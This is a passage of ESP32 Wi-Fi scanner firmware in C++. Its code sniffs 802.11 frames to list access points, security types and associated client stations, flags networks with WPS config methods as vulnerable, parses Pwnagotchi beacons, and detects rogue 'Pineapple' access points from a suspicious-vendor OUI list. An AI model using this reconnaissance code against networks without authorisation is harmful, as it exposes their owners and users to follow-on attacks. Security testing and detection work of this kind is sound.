  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String src = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      src.concat(addr);
      if (src == "de:ad:be:ef:de:ad") {
        
        
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        //display_string.concat(addr);
        display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");

        // Just grab the first 255 bytes of the pwnagotchi beacon
        // because that is where the name is
        //for (int i = 0; i < snifferPacket->payload[37]; i++)
        for (int i = 0; i < len - 37; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          //display_string.concat((char)snifferPacket->payload[i + 38]);
          if (isAscii(snifferPacket->payload[i + 38]))
            essid.concat((char)snifferPacket->payload[i + 38]);
          else
            Serial.println("Got non-ascii character: " + (String)(char)snifferPacket->payload[i + 38]);
        }
        //essid.concat("\": \"\"}}");
        //Serial.println("\n" + (String)(snifferPacket->payload[37]) + " -> " + essid);

        // Load json
        //DynamicJsonBuffer jsonBuffer; // ArduinoJson v5
        DynamicJsonDocument json(1024); // ArduinoJson v6
        //JsonObject& json = jsonBuffer.parseObject(essid); // ArduinoJson v5
         // ArduinoJson v6
        if (deserializeJson(json, essid)) {
          Serial.println("\nCould not parse Pwnagotchi json");
          display_string.concat(essid);
        }
        else {
          Serial.println("\nSuccessfully parsed json");
          String json_output;
          //json.printTo(json_output); // ArduinoJson v5
          serializeJson(json, json_output); // ArduinoJson v6
          Serial.println(json_output);
          display_string.concat(json["name"].as<String>() + " pwnd: " + json["pwnd_tot"].as<String>());
        }
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          display_obj.display_buffer->add(display_string);
        #endif

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

int WiFiScan::checkMatchAP(char addr[]) {
  for (int i = 0; i < access_points->size(); i++) {
    bool mac_match = true;

    for (int x = 0; x < 6; x++) {
      if ((uint8_t)strtol(&addr[x * 3], NULL, 16) != access_points->get(i).bssid[x]) {
        mac_match = false;
        break;
      }
    }

    if (mac_match) {
      AccessPoint ap = access_points->get(i);
      ap.packets += 1;
      access_points->set(i, ap);
      return i;
    }
  }
  return -1;
}

String WiFiScan::extractManufacturer(const uint8_t* payload) {
  const int fixedHeaderSize = 36; // 802.11 mgmt header (24) + fixed fields (12)
  int pos = fixedHeaderSize;

  while (pos < 512) { // safety bounds
    uint8_t tagNumber = payload[pos];
    uint8_t tagLength = payload[pos + 1];

    // Check for vendor-specific IE (Tag number 221)
    if (tagNumber == 0xdd && tagLength >= 4) {
      const uint8_t* oui = &payload[pos + 2];
      
      // Check if OUI is 00:50:F2 (Microsoft WPS)
      if (oui[0] == 0x00 && oui[1] == 0x50 && oui[2] == 0xF2) {
        int wpsPos = pos + 6; // Skip: tag + len + OUI (2 + 1 + 3)
        int end = pos + 2 + tagLength;

        // Iterate through WPS sub-TLVs
        while (wpsPos + 4 <= end) {
          uint16_t type = (payload[wpsPos] << 8) | payload[wpsPos + 1];
          uint16_t len = (payload[wpsPos + 2] << 8) | payload[wpsPos + 3];

          if (type == 0x1021) { // Manufacturer
            char buffer[65]; // reasonable max
            int copyLen = len > 64 ? 64 : len;
            memcpy(buffer, &payload[wpsPos + 4], copyLen);
            buffer[copyLen] = '\0';
            return String(buffer);
          }

          wpsPos += 4 + len;
        }
      }
    }

    pos += 2 + tagLength;
  }

  return String(""); // not found
}

void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type) {  
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  bool mem_check = wifi_scan_obj.checkMem();

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    //int fctl = ntohs(frameControl->fctl);
    //const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    //const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif

    bool wps = wifi_scan_obj.beaconHasWPS(snifferPacket->payload, len);

    // We got a probe resp. Check for WPS configs
    if (snifferPacket->payload[0] == 0x50) {

      String man = wifi_scan_obj.extractManufacturer(snifferPacket->payload);

      if (wps) {
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);

        int index = wifi_scan_obj.checkMatchAP(addr);

        if ((index > 0) && (!access_points->get(index).wps)) {
          AccessPoint new_ap = access_points->get(index);
          new_ap.wps = true;
          new_ap.man = man;
          access_points->set(index, new_ap);
          Serial.println((String)access_points->get(index).essid + ": RXd WPS Configs");

          #ifdef HAS_SCREEN
            display_string = RED_KEY;
            display_string.concat((String)access_points->get(index).essid + ": RXd WPS Configs");
            int temp_len = display_string.length();

            for (int i = 0; i < 50 - temp_len; i++)
              display_string.concat(" ");

            display_obj.display_buffer->add(display_string);
          #endif
        }
      }
    }

    // We got an AP. Check if in list and add if not
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      // Get security info
      uint8_t security_type = wifi_scan_obj.getSecurityType(snifferPacket->payload, len);
      
      #ifdef HAS_SCREEN
        if (!wps)
          display_string = GREEN_KEY;
        else
          display_string = RED_KEY;
      #endif
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      int in_list = wifi_scan_obj.checkMatchAP(addr);

      if (in_list < 0) {
      
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        #ifdef HAS_SCREEN
          display_string.concat("#");
          display_string.concat(access_points->size());
          display_string.concat(" ");
        #endif
        #ifdef HAS_FULL_SCREEN
          display_string.concat(snifferPacket->rx_ctrl.rssi);
          display_string.concat(" ");
          display_string.concat(snifferPacket->rx_ctrl.channel);
          display_string.concat(" ");
        #endif

        Serial.print(" ESSID: ");
        if (snifferPacket->payload[37] <= 0)
          display_string.concat(addr);
        else {
          for (int i = 0; i < snifferPacket->payload[37]; i++)
          {
            Serial.print((char)snifferPacket->payload[i + 38]);
            display_string.concat((char)snifferPacket->payload[i + 38]);
            essid.concat((char)snifferPacket->payload[i + 38]);
          }
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 50 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          if (wifi_scan_obj.checkMem())
            display_obj.display_buffer->add(display_string);
          else {
            String warning_str = "Mem limit reached " + display_string;
            display_obj.display_buffer->add(warning_str);
          }
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }

        if (wifi_scan_obj.checkMem()) {

          AccessPoint ap;
          ap.essid = essid;
          ap.channel = snifferPacket->rx_ctrl.channel;
          ap.bssid[0] = snifferPacket->payload[10];
          ap.bssid[1] = snifferPacket->payload[11];
          ap.bssid[2] = snifferPacket->payload[12];
          ap.bssid[3] = snifferPacket->payload[13];
          ap.bssid[4] = snifferPacket->payload[14];
          ap.bssid[5] = snifferPacket->payload[15];
          ap.selected = false;
          ap.stations = new LinkedList<uint16_t>();
          
          //ap.beacon = new LinkedList<char>();

          //for (int i = 0; i < len; i++) {
          //  ap.beacon->add(snifferPacket->payload[i]);
          //}
          ap.beacon[0] = snifferPacket->payload[34];
          ap.beacon[1] = snifferPacket->payload[35];
          //ap.beacon->add(snifferPacket->payload[34]);
          //ap.beacon->add(snifferPacket->payload[35]);

          Serial.print("\nBeacon: ");

          for (int i = 0; i < 2; i++) {
            char hexCar[4];
            //sprintf(hexCar, "%02X", ap.beacon->get(i));
            sprintf(hexCar, "%02X", ap.beacon[i]);
            Serial.print(hexCar);
            if ((i + 1) % 16 == 0)
              Serial.print("\n");
            else
              Serial.print(" ");
          }

          ap.rssi = snifferPacket->rx_ctrl.rssi;

          ap.sec = security_type;

          ap.wps = wps;

          ap.packets = 0;

          ap.man = "";

          access_points->add(ap);

          Serial.print(access_points->size());
          Serial.print(" ");
          Serial.print(esp_get_free_heap_size());
          #ifdef HAS_PSRAM
            Serial.print(" ");
            Serial.print(heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
          #endif

        }

        Serial.println();

        buffer_obj.append(snifferPacket, len);

        return;
      }
    }
  }

  // We got a client possibly associated with AP. Check for AP association
  //if ((snifferPacket->payload[0] != 0x80) && (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP_STA)) {
  if ((type == WIFI_PKT_DATA) && (wifi_scan_obj.currentScanMode == WIFI_SCAN_AP_STA)) {
    #ifdef HAS_SCREEN
      display_string = CYAN_KEY;
    #endif
    // Setup our ap and destination addrs
    char ap_addr[] = "00:00:00:00:00:00";
    char dst_addr[] = "00:00:00:00:00:00";

    int ap_index = 0;

    // Check if frame has ap in list of APs and determine position
    uint8_t frame_offset = 0;
    int offsets[2] = {10, 4};
    bool matched_ap = false;
    bool ap_is_src = false;

    bool mac_match = true;

    // Check both addrs for AP addr
    for (int y = 0; y < 2; y++) {
      // Iterate through all APs
      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        
        // Go through each byte in addr
        for (int x = 0; x < 6; x++) {
          if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
            mac_match = false;
            break;
          }
        }
        if (mac_match) {
          matched_ap = true;
          if (offsets[y] == 10)
            ap_is_src = true;
          ap_index = i;
          getMAC(ap_addr, snifferPacket->payload, offsets[y]);
          break;
        }
      }
      if (matched_ap)
        break;
    }

    // If did not find ap from list in frame, drop frame
    if (!matched_ap)
      return;
    else {
      if (ap_is_src)
        frame_offset = 4;
      else
        frame_offset = 10;
    }    

    // Check if we already have this station
    bool in_list = false;
    for (int i = 0; i < stations->size(); i++) {
      mac_match = true;
      
      for (int x = 0; x < 6; x++) {
        if (snifferPacket->payload[x + frame_offset] != stations->get(i).mac[x]) {
          mac_match = false;
          break;
        }
      }
      if (mac_match) {
        in_list = true;
        break;
      }
    }

    getMAC(dst_addr, snifferPacket->payload, 4);

    // Check if dest is broadcast
    if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
      return;
    
    // Add to list of stations
    if (mem_check) {
      Station sta = {
                    {snifferPacket->payload[frame_offset],
                    snifferPacket->payload[frame_offset + 1],
                    snifferPacket->payload[frame_offset + 2],
                    snifferPacket->payload[frame_offset + 3],
                    snifferPacket->payload[frame_offset + 4],
                    snifferPacket->payload[frame_offset + 5]},
                    false,
                    0};

      stations->add(sta);
    }

    // Print findings to serial
    Serial.print((String)stations->size() + ": ");
    
    char sta_addr[] = "00:00:00:00:00:00";
    
    if (ap_is_src) {
      Serial.print("ap: ");
      Serial.print(ap_addr);
      Serial.print(" -> sta: ");
      getMAC(sta_addr, snifferPacket->payload, 4);
      Serial.println(sta_addr);
    }
    else {
      Serial.print("sta: ");
      getMAC(sta_addr, snifferPacket->payload, 10);
      Serial.print(sta_addr);
      Serial.print(" -> ap: ");
      Serial.println(ap_addr);
    }

    display_string.concat(replaceOUIWithManufacturer(sta_addr));

    display_string.concat(" -> ");
    display_string.concat(access_points->get(ap_index).essid);

    int temp_len = display_string.length();

    #ifdef HAS_SCREEN
      for (int i = 0; i < 50 - temp_len; i++)
      {
        display_string.concat(" ");
      }

      Serial.print(" ");

      if (mem_check)
        display_obj.display_buffer->add(display_string);
      else {
        String warning_str = "Memory lim reached " + display_string;
        display_obj.display_buffer->add(warning_str);
      }
    #endif

    if (mem_check) {
      AccessPoint ap = access_points->get(ap_index);
      ap.stations->add(stations->size() - 1);

      access_points->set(ap_index, ap);
    }

    buffer_obj.append(snifferPacket, len);
  }
}

bool WiFiScan::beaconHasWPS(const uint8_t* payload, int len) {
  int i = 36; // skip radiotap + fixed 802.11 header

  while (i < len - 2) {
    uint8_t tagNumber = payload[i];
    uint8_t tagLength = payload[i + 1];

    if (i + 2 + tagLength > len) break; // prevent overflow
    const uint8_t* tagData = &payload[i + 2];

    // Look for Tag Number 0xDD (Vendor Specific)
    if (tagNumber == 0xDD && tagLength >= 6) {
      // Check for WPS OUI: 00:50:F2 and WPS type: 0x04
      if (tagData[0] == 0x00 && tagData[1] == 0x50 && tagData[2] == 0xF2 && tagData[3] == 0x04) {
        // Parse the WPS IE data starting after the OUI and type
        int wpsLen = tagLength - 4;
        const uint8_t* wpsData = &tagData[4];
        int j = 0;

        while (j + 4 <= wpsLen) {
          uint16_t attrType = (wpsData[j] << 8) | wpsData[j + 1];
          uint16_t attrLen  = (wpsData[j + 2] << 8) | wpsData[j + 3];

          if (j + 4 + attrLen > wpsLen) break; // prevent overflow

          if (attrType == 0x1008 && attrLen == 2) { // Config Methods attribute
            uint16_t configMethods = (wpsData[j + 4] << 8) | wpsData[j + 5];

            // Check for any vulnerable method
            if (configMethods & (WPS_CONFIG_LABEL |
                                 WPS_CONFIG_DISPLAY |
                                 WPS_CONFIG_KEYPAD |
                                 WPS_CONFIG_VIRT_DISPLAY |
                                 WPS_CONFIG_PHY_DISPLAY |
                                 WPS_CONFIG_PUSH_BUTTON |
                                 WPS_CONFIG_VIRT_PUSH_BUTTON |
                                 WPS_CONFIG_PHY_PUSH_BUTTON)) {
              return true;
            }
          }

          j += 4 + attrLen;
        }
      }
    }

    i += 2 + tagLength;
  }

  return false;
}

uint8_t WiFiScan::getSecurityType(const uint8_t* beacon, uint16_t len) {
  const uint8_t* frame = beacon;
  const uint8_t* ies = beacon + 36; // Start of tagged parameters
  uint16_t ies_len = len - 36;

  bool hasRSN = false;
  bool hasWPA = false;
  bool hasWEP = false;
  bool isEnterprise = false;
  bool isWPA3 = false;
  bool isWAPI = false;

  uint16_t i = 0;
  while (i + 2 <= ies_len) {
    uint8_t tag_id = ies[i];
    uint8_t tag_len = ies[i + 1];

    if (i + 2 + tag_len > ies_len) break;

    const uint8_t* tag_data = ies + i + 2;

    // Check for RSN (WPA2)
    if (tag_id == 48) {
      hasRSN = true;

      // WPA2-Enterprise usually uses 802.1X AKM (type 1)
      if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x0f && tag_data[18] == 0xac) {
        isEnterprise = true;
      }

      // WPA3 typically uses SAE (type 8)
      if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x0f && tag_data[18] == 0xac && tag_data[19] == 0x08) {
        isWPA3 = true;
      }
    }

    // Check for WPA (in vendor specific tag)
    else if (tag_id == 221 && tag_len >= 8 &&
        tag_data[0] == 0x00 && tag_data[1] == 0x50 && tag_data[2] == 0xF2 && tag_data[3] == 0x01) {
      hasWPA = true;

      // WPA-Enterprise (AKM 1)
      if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x50 && tag_data[18] == 0xf2) {
        isEnterprise = true;
      }
    }

    // Check for WAPI (Chinese standard)
    else if (tag_id == 221 && tag_len >= 4 &&
        tag_data[0] == 0x00 && tag_data[1] == 0x14 && tag_data[2] == 0x72 && tag_data[3] == 0x01) {
      isWAPI = true;
    }

    i += 2 + tag_len;
  }

  // Decision tree
  if (isWAPI) return WIFI_SECURITY_WAPI;
  if (hasRSN && isWPA3) return WIFI_SECURITY_WPA3;
  if (hasRSN && isEnterprise) return WIFI_SECURITY_WPA2_ENTERPRISE;
  if (hasRSN && hasWPA) return WIFI_SECURITY_WPA_WPA2_MIXED;
  if (hasRSN) return WIFI_SECURITY_WPA2;
  if (hasWPA) return isEnterprise ? WIFI_SECURITY_WPA2_ENTERPRISE : WIFI_SECURITY_WPA;
  
  // WEP is identified via capability flags
  uint16_t capab_info = ((uint16_t)frame[34] << 8) | frame[35];
  if (capab_info & 0x0010) return WIFI_SECURITY_WEP;

  return WIFI_SECURITY_OPEN;
}

void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;

        
        for (int x = 0; x < 6; x++) {
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
          essid.concat((char)snifferPacket->payload[i + 38]);

          
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        #ifdef HAS_SCREEN
          display_obj.display_buffer->add(display_string);
        #endif
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }

        // Get security info
        uint8_t security_type = wifi_scan_obj.getSecurityType(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);
        
        bool wps = wifi_scan_obj.beaconHasWPS(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);
        
        /*AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          NULL,
                          snifferPacket->rx_ctrl.rssi,
                          new LinkedList<uint16_t>(),
                          0,
                          security_type,
                          wps};*/

        AccessPoint ap = {essid,
                          snifferPacket->rx_ctrl.channel,
                          {snifferPacket->payload[10],
                           snifferPacket->payload[11],
                           snifferPacket->payload[12],
                           snifferPacket->payload[13],
                           snifferPacket->payload[14],
                           snifferPacket->payload[15]},
                          false,
                          {snifferPacket->payload[34], snifferPacket->payload[35]},
                          snifferPacket->rx_ctrl.rssi,
                          new LinkedList<uint16_t>(),
                          0,
                          security_type,
                          wps};

        access_points->add(ap);

        Serial.print(access_points->size());
        Serial.print(" ");
        Serial.print(esp_get_free_heap_size());
        #ifdef HAS_PSRAM
          Serial.print(" ");
          Serial.print(heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
        #endif

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

String WiFiScan::processPwnagotchiBeacon(const uint8_t* frame, int length) {
  // Approximate the start of JSON payload within the beacon frame
  int jsonStartIndex = 36; // Adjust based on actual frame structure if necessary
  int jsonEndIndex = length;

  // Locate the actual JSON boundaries by finding '{' and '}'
  while (jsonStartIndex < length && frame[jsonStartIndex] != '{') jsonStartIndex++;
  while (jsonEndIndex > jsonStartIndex && frame[jsonEndIndex - 1] != '}') jsonEndIndex--;

  if (jsonStartIndex >= jsonEndIndex) {
    Serial.println("JSON payload not found.");
    return "";
  }

  // Extract JSON substring from frame directly
  String jsonString = String((char*)frame + jsonStartIndex, jsonEndIndex - jsonStartIndex);

  // Estimate an appropriate JSON document size based on payload length
  size_t jsonCapacity = jsonString.length() * 1.5; // Adding buffer for ArduinoJson needs

  // Check if we have enough memory before creating StaticJsonDocument
  if (jsonCapacity > ESP.getFreeHeap()) {
    Serial.println("Insufficient memory to parse JSON.");
    return "";
  }

  // Parse JSON payload using ArduinoJson library
  StaticJsonDocument<2048> doc;
  DeserializationError error = deserializeJson(doc, jsonString);

  if (error) {
    Serial.print("Failed to parse JSON: ");
    Serial.println(error.c_str());
    return "";
  }

  // Check for Pwnagotchi keys "name" and "pwnd_tot"
  if (doc.containsKey("name") && doc.containsKey("pwnd_tot")) {
    const char* name = doc["name"];
    const char* ver = doc["version"];
    int pwnd_tot = doc["pwnd_tot"];
    bool deauth = doc["policy"]["deauth"];
    int uptime = doc["uptime"];

    // Print and return the Pwnagotchi name and pwnd_tot
    Serial.print("Pwnagotchi Name: ");
    Serial.println(name);
    Serial.print("Pwnd Totals: ");
    Serial.println(pwnd_tot);

    #ifdef HAS_SCREEN

      display_obj.display_buffer->add(String("Pwnagotchi: ") + name + ",                 ");
      display_obj.display_buffer->add("      Pwnd: " + String(pwnd_tot) + ",             ");
      display_obj.display_buffer->add("    Uptime: " + String(uptime) + ",               ");
      if (deauth)
        display_obj.display_buffer->add("    Deauth: true,                       ");
      else
        display_obj.display_buffer->add("    Deauth: false,                      ");

      display_obj.display_buffer->add(String("       Ver: ") + ver + "                   ");
    #endif

    return String("Pwnagotchi: ") + name + ", \nPwnd: " + String(pwnd_tot) + ", \nVer: " + ver;
  } else {
    Serial.println("Not a Pwnagotchi frame.");
    return "";
  }
}

// PINEAPPLE LOGIC

// Define lookup table for Pineapple OUIs

const WiFiScan::SuspiciousVendor WiFiScan::suspicious_vendors[] = {
    // Alfa
    {"Alfa Inc", SUSPICIOUS_WHEN_OPEN, {0x00C0CA}, 1},
    
    // Orient Power (Pineapple MK7)
    {"Orient Power Home Network Ltd", SUSPICIOUS_ALWAYS, {0x001337}, 1},
    
    // Shenzhen Century
    {"Shenzhen Century Xinyang Technology Co Ltd", SUSPICIOUS_WHEN_OPEN, {0x1CBFCE}, 1},
    
    // IEEE
    {"IEEE Registration Authority", SUSPICIOUS_WHEN_OPEN, {0x0CEFAF}, 1},
    
    // Hak5 (Locally Administered)
    {"Hak5", SUSPICIOUS_WHEN_PROTECTED, {0x02C0CA, 0x021337}, 2},
    
    // MediaTek
    {"MediaTek Inc", SUSPICIOUS_ALWAYS, {0x000A00, 0x000C43, 0x000CE7, 0x0017A5}, 4},
    
    // Panda Wireless
    {"Panda Wireless Inc", SUSPICIOUS_ALWAYS, {0x9CEFD5, 0x9CE5D5}, 2},
    
    // Unassigned/Spoofed
    {"Unassigned/Spoofed", SUSPICIOUS_ALWAYS, {0xDEADBE}, 1}
};

// Total OUI count: 13

// Update the number of vendors constant
const int WiFiScan::NUM_SUSPICIOUS_VENDORS = sizeof(WiFiScan::suspicious_vendors) / sizeof(WiFiScan::suspicious_vendors[0]);

// This fixes picking up a AP on an adjacent channel.
int WiFiScan::extractPineScanChannel(const uint8_t* payload, int len) {
    if (len < 38) return -1; // Ensure we have enough data

    // Jump to the element fields after the fixed beacon header and SSID field
    int pos = 36 + payload[37] + 2; // 36 fixed header bytes + SSID length + 2 bytes for SSID tag info

    // Search through the tags for the channel information (DS Parameter Set, tag number 3)
    while (pos < len - 2) {
        uint8_t tag_num = payload[pos];
        uint8_t tag_len = payload[pos + 1];
        
        // Safety check to prevent buffer overruns
        if (pos + 2 + tag_len > len) break;
        
        // Found DS Parameter Set (tag 3), channel is the next byte
        if (tag_num == 3 && tag_len == 1) {
            return payload[pos + 2]; // Return the channel
        }
        pos += tag_len + 2;
    }
    
    // If channel not found in the beacon, return the one from rx_ctrl
    return -1;
}

// Function to count tagged parameters in beacon frames
bool countPineScanTaggedParameters(const uint8_t* payload, int len) {
  int ssid_len = payload[37];
  int pos = 36 + ssid_len + 2;
  
  // Check if next tag is the DS Parameter (channel info) - tag number 3
  if (pos < len - 2 && payload[pos] == 3 && payload[pos+1] == 1) {
    // Check for end of packet after DS Parameter (no more tags)
    int next_pos = pos + 2 + payload[pos+1];
    return (next_pos >= len || next_pos + 2 > len);
  }
  
  return false;
}

void WiFiScan::pineScanSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT) {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  
    #ifdef HAS_SCREEN
      int buff = display_obj.display_buffer->size();
    #else
      int buff = 0;
    #endif
    
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0)) {
      buffer_obj.append(snifferPacket, len); // Capture all beacons
      
      // Extract MAC address for Pineapple detection
      uint8_t mac_addr[6];
      for (int i = 0; i < 6; i++) {
        mac_addr[i] = snifferPacket->payload[10 + i];
      }

      // Extract channel from the beacon frame
      int ap_channel = WiFiScan::extractPineScanChannel(snifferPacket->payload, len);
      if (ap_channel == -1) {
        ap_channel = snifferPacket->rx_ctrl.channel;
      }
      
      // Extract capability flags
      uint16_t capab_info = ((uint16_t)snifferPacket->payload[34] | ((uint16_t)snifferPacket->payload[35] << 8));
      bool suspicious_capability = (capab_info == 0x0001);
      bool tag_count = countPineScanTaggedParameters(snifferPacket->payload, len);
      bool tag_and_susp_cap = suspicious_capability && tag_count;

      bool is_protected = (capab_info & 0x10) != 0;
      bool is_open = !is_protected;
      String auth_type = is_open ? "OPEN" : "PROTECTED";

      // Check for suspicious OUIs
      uint8_t oui[3] = {snifferPacket->payload[10], snifferPacket->payload[11], snifferPacket->payload[12]};
      uint32_t oui_value = ((uint32_t)oui[0] << 16) | ((uint32_t)oui[1] << 8) | oui[2];
      
      bool suspicious_oui = false;
      bool pinescan_match = false;
      bool pinescan_match_by_oui = false;
      const char* vendor_name = "Unknown";

      // Check against suspicious vendors list
      for (int i = 0; i < WiFiScan::NUM_SUSPICIOUS_VENDORS; i++) {
        const WiFiScan::SuspiciousVendor& vendor = WiFiScan::suspicious_vendors[i];

        // Check each OUI for this vendor
        for (int j = 0; j < vendor.oui_count; j++) {
          if (oui_value == vendor.ouis[j]) {
            if ((vendor.security_flags & SUSPICIOUS_ALWAYS) || 
                (is_open && (vendor.security_flags & SUSPICIOUS_WHEN_OPEN)) || 
                (is_protected && (vendor.security_flags & SUSPICIOUS_WHEN_PROTECTED))) {
              suspicious_oui = true;
              pinescan_match = true;
              vendor_name = vendor.vendor_name;
              pinescan_match_by_oui = true;
              break;
            }
          }
        }
        if (pinescan_match_by_oui) break;
      }

      pinescan_match = pinescan_match || tag_and_susp_cap;
      
      if ((tag_and_susp_cap) && !suspicious_oui) {
        vendor_name = "Unknown";
      }

      // Check if we have already seen this MAC
      int ap_index = -1;
      bool already_tracked = false;
      
      // Find if have seen this MAC before in the tracking list
      for (int i = 0; i < wifi_scan_obj.pinescan_trackers->size(); i++) {
        bool mac_match = true;
        for (int x = 0; x < 6; x++) {
          if (mac_addr[x] != wifi_scan_obj.pinescan_trackers->get(i).mac[x]) {
            mac_match = false;
            break;
          }
        }
        
        if (mac_match) {
          ap_index = i;
          already_tracked = true;
          break;
        }
      }

      // Check if already in confirmed list
      bool already_confirmed = false;
      int confirmed_index = -1;
      
      for (int i = 0; i < wifi_scan_obj.confirmed_pinescan->size(); i++) {
        bool mac_match = true;
        for (int x = 0; x < 6; x++) {
          if (mac_addr[x] != wifi_scan_obj.confirmed_pinescan->get(i).mac[x]) {
            mac_match = false;
            break;
